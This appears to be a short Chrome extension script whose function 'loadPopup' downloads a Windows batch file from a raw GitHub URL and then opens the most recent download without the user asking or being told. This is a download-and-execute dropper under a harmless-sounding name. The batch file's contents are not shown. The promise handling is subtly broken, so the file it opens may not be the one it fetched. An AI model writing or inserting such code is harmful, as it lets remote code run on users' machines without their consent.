function loadPopup() {
  let download = chrome.downloads.download({url: "https://raw.githubusercontent.com/aaaabbbbeeeeddddss/testing.github.io/main/test.bat"});

function onOpened() {
  alert(`Opened download item`);
}

function onError(error) {
  alert(`Error opening item: ${error}`);
}

function openDownload(downloadItems) {
  if (downloadItems.length > 0) {
    let opening = chrome.downloads.open(downloadItems[0].id);
    opening.then(onOpened, onError);
  }
}

let searching = chrome.downloads.search({
  limit: 1,
  orderBy: ["-startTime"],
});

download.then(searching.then(openDownload, onError));
}
